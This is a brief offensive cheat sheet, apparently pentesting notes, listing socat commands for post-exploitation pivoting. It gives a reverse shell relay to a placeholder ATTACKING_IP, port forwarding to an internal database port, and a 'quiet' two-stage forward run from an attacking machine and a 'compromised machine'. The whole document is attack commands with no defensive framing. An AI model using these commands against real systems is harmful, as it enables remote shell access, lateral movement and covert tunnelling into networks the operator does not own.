# Socat

```java
// Reverse shell Relay
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &

// Port Forwarding -- Simple
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

// Port Forwarding -- Quiet
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr & // Our attacking machine
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork & // Compromised machine
```
